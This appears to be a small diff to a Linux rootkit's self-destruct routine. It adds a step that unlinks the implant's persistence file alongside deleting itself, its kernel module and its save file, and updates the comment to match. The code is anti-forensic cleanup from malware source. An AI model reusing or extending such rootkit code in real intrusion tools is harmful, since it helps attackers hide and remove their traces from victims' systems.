@@ -14,7 +14,7 @@
 
 /*
 
- * first it deletes the kernel module, the save file and itself
+ * first it deletes itself, the kernel module, the save file and the persistence file
  * then it unloads the kernel module
  * lastly sets "should_quit" to break the main loop
 
@@ -51,6 +51,12 @@ skip_self:
 
   // after that, remove the save file
   save_remove();
+
+  // next, lets remove the persistence file
+  if (SHRK_PERSIS_FILE[0] != 0 && unlink(SHRK_PERSIS_FILE) != 0) {
+    debug_err("failed to unlink the persistence file");
+    return strerror(errno);
+  }
 
   // lastly unload the kernel module
   if (!kernel_unload()) {
